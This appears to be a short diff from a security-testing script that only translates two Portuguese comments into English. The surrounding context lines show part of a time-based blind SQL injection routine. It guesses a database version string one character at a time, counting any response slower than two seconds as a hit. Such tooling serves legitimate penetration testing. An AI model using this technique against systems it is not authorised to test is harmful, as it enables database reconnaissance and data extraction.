@@ -30,7 +30,7 @@ def blind_sql_injection_attack():
     tests_failed = 0
     details = []
     version_number = ''
-    version_length = 5  # Suposição do comprimento da versão para teste
+    version_length = 5  # Assumption of test version length
 
     for i in range(1, version_length + 1):
         found = False
@@ -41,7 +41,7 @@ def blind_sql_injection_attack():
             elapsed_time = time.time() - start_time
             total_tests += 1
 
-            # Supõe que um tempo de resposta maior que 2 segundos é um teste bem-sucedido
+            # Assumes a response time greater than 2 seconds is a successful test
             if elapsed_time > 2:
                 version_number += chr(ascii_code)
                 tests_passed += 1
